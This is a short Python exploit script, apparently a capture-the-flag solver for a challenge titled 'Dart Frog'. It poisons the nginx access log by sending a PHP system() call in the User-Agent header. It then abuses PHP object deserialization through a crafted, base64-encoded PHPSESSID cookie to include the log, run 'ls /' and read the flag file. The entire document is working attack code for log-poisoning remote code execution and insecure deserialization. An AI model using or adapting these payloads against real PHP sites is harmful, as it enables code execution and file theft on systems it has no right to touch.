import requests
import argparse
import base64
import re

parser = argparse.ArgumentParser()
parser.add_argument('--host', type=str, required=True)
args = parser.parse_args()

def validate_host():
    r = requests.get(f'http://{args.host}')
    if r.text.find('Dart Frog') == -1:
        print(f'\tThe HOST {args.host} is not valid')
        exit(1)

def create_payload(path):
    message = f'O:9:"PageModel":1:{{s:4:"file";s:{len(path)}:"{path}";}}'
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    payload = base64_bytes.decode('ascii')
    return payload

def infect_log():
    user_agent = {'User-agent': "<?php system('ls /');?>"}
    r = requests.get(f'http://{args.host}', headers=user_agent)

def extract(payload):
    cookies = {'PHPSESSID': payload}
    r = requests.get(f'http://{args.host}', cookies=cookies)
    return r.text

def main():
    validate_host()
    infect_log()
    result_ls = extract(create_payload('/var/log/nginx/access.log'))
    flag_file_name = re.findall(r'flag(.+?)\n', result_ls)
    flag = extract(create_payload(f'/flag{flag_file_name[0]}'))
    print(f'\t🏁 The FLAG is {flag}')
    exit(0)         

main()